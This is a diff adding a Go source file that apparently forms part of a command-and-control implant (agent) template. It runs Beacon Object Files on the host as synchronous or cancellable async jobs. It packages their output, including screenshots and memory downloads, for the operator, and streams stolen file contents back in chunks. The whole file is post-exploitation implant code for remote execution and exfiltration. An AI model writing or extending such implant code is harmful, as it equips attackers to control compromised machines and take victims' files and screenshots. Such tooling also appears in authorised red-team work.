@@ -1,0 +1,179 @@
+package main
+
+import (
+	"encoding/binary"
+	"fmt"
+	"sync"
+
+	"__NAME__/impl"
+	"__NAME__/protocol"
+)
+
+var (
+	asyncBinaryMu    sync.Mutex
+	asyncBinaryInner []byte
+)
+
+func queueBinaryResponse(taskID uint32, commandID uint32, payload []byte) {
+	w := protocol.NewWriterBE()
+	w.WriteUint32(taskID)
+	w.WriteUint32(commandID)
+	w.WriteRaw(payload)
+	asyncBinaryMu.Lock()
+	asyncBinaryInner = append(asyncBinaryInner, w.Bytes()...)
+	asyncBinaryMu.Unlock()
+}
+
+func drainBinaryResponses() []byte {
+	asyncBinaryMu.Lock()
+	defer asyncBinaryMu.Unlock()
+	if len(asyncBinaryInner) == 0 {
+		return nil
+	}
+	out := append([]byte(nil), asyncBinaryInner...)
+	asyncBinaryInner = nil
+	return out
+}
+
+func wrapBinaryResponseInner(inner []byte) []byte {
+	if len(inner) == 0 {
+		return nil
+	}
+	w := protocol.NewWriterBE()
+	w.WriteUint32(uint32(len(inner) + 4))
+	w.WriteRaw(inner)
+	return w.Bytes()
+}
+
+func mergeBinaryResponseBlobs(blob []byte) []byte {
+	queued := drainBinaryResponses()
+	if len(queued) == 0 {
+		return blob
+	}
+	if len(blob) < 4 {
+		return wrapBinaryResponseInner(queued)
+	}
+	inner := append([]byte(nil), blob[4:]...)
+	inner = append(inner, queued...)
+	return wrapBinaryResponseInner(inner)
+}
+
+func decodeTaggedBlob(data []byte) (string, []byte) {
+	if len(data) < 4 {
+		return "", append([]byte(nil), data...)
+	}
+	nameLen := int(binary.LittleEndian.Uint32(data[:4]))
+	if nameLen < 0 || 4+nameLen > len(data) {
+		return "", append([]byte(nil), data...)
+	}
+	name := string(data[4 : 4+nameLen])
+	payload := append([]byte(nil), data[4+nameLen:]...)
+	return name, payload
+}
+
+func queueDefaultBofOutput(taskID uint32, msg protocol.BofMsg) {
+	w := protocol.NewWriterBE()
+	w.WriteUint32(uint32(msg.Type))
+	switch msg.Type {
+	case protocol.CALLBACK_AX_SCREENSHOT, protocol.CALLBACK_AX_DOWNLOAD_MEM:
+		name, payload := decodeTaggedBlob(msg.Data)
+		w.WriteString(name)
+		w.WriteBytes(payload)
+	default:
+		w.WriteString(string(msg.Data))
+	}
+	queueBinaryResponse(taskID, protocol.COMMAND_EXEC_BOF_OUT, w.Bytes())
+}
+
+func runAsyncDefaultBof(taskID uint32, object []byte, args []byte, jobID uint32) {
+	jobs.SetState(jobID, impl.JobStateRunning)
+	start := protocol.NewWriterBE()
+	start.WriteUint8(1)
+	queueBinaryResponse(taskID, protocol.COMMAND_EXEC_BOF, start.Bytes())
+
+	stopCh, _ := jobs.StopSignal(jobID)
+	go func() {
+		defer jobs.Remove(jobID)
+
+		select {
+		case <-stopCh:
+			queueDefaultBofOutput(taskID, protocol.BofMsg{Type: protocol.CALLBACK_ERROR, Data: []byte("async BOF canceled before execution")})
+			finish := protocol.NewWriterBE()
+			finish.WriteUint8(0)
+			queueBinaryResponse(taskID, protocol.COMMAND_EXEC_BOF, finish.Bytes())
+			jobs.SetState(jobID, impl.JobStateStopped)
+			return
+		default:
+		}
+
+		ctx := impl.ObjectExecute(object, args)
+		if ctx != nil {
+			ctx.Drain()
+			for _, msg := range ctx.Msgs {
+				queueDefaultBofOutput(taskID, msg)
+			}
+		} else {
+			queueDefaultBofOutput(taskID, protocol.BofMsg{Type: protocol.CALLBACK_ERROR, Data: []byte("async BOF execution failed")})
+		}
+
+		select {
+		case <-stopCh:
+			queueDefaultBofOutput(taskID, protocol.BofMsg{Type: protocol.CALLBACK_ERROR, Data: []byte("async BOF canceled")})
+			jobs.SetState(jobID, impl.JobStateStopped)
+		default:
+			jobs.SetState(jobID, impl.JobStateFinished)
+		}
+
+		finish := protocol.NewWriterBE()
+		finish.WriteUint8(0)
+		queueBinaryResponse(taskID, protocol.COMMAND_EXEC_BOF, finish.Bytes())
+	}()
+}
+
+func queueDownloadSequence(taskID uint32, fileID uint32, path string, data []byte) {
+	start := protocol.NewWriterBE()
+	start.WriteUint32(fileID)
+	start.WriteUint8(DOWNLOAD_START)
+	start.WriteUint64(uint64(len(data)))
+	start.WriteString(path)
+	queueBinaryResponse(taskID, protocol.COMMAND_DOWNLOAD, start.Bytes())
+
+	chunk := chunkSize
+	if chunk <= 0 {
+		chunk = 64 * 1024
+	}
+	for offset := 0; offset < len(data); offset += chunk {
+		end := offset + chunk
+		if end > len(data) {
+			end = len(data)
+		}
+		cont := protocol.NewWriterBE()
+		cont.WriteUint32(fileID)
+		cont.WriteUint8(DOWNLOAD_CONTINUE)
+		cont.WriteBytes(data[offset:end])
+		queueBinaryResponse(taskID, protocol.COMMAND_DOWNLOAD, cont.Bytes())
+	}
+
+	finish := protocol.NewWriterBE()
+	finish.WriteUint32(fileID)
+	finish.WriteUint8(DOWNLOAD_FINISH)
+	queueBinaryResponse(taskID, protocol.COMMAND_DOWNLOAD, finish.Bytes())
+}
+
+func queueSyncBof(taskID uint32, object []byte, args []byte) {
+	ctx := impl.ObjectExecute(object, args)
+	if ctx == nil {
+		queueDefaultBofOutput(taskID, protocol.BofMsg{Type: protocol.CALLBACK_ERROR, Data: []byte("BOF execution failed")})
+		return
+	}
+	ctx.Drain()
+	for _, msg := range ctx.Msgs {
+		queueDefaultBofOutput(taskID, msg)
+	}
+}
+
+func queueGenericError(taskID uint32, commandID uint32, format string, args ...interface{}) {
+	w := protocol.NewWriterBE()
+	w.WriteString(fmt.Sprintf(format, args...))
+	queueBinaryResponse(taskID, commandID, w.Bytes())
+}
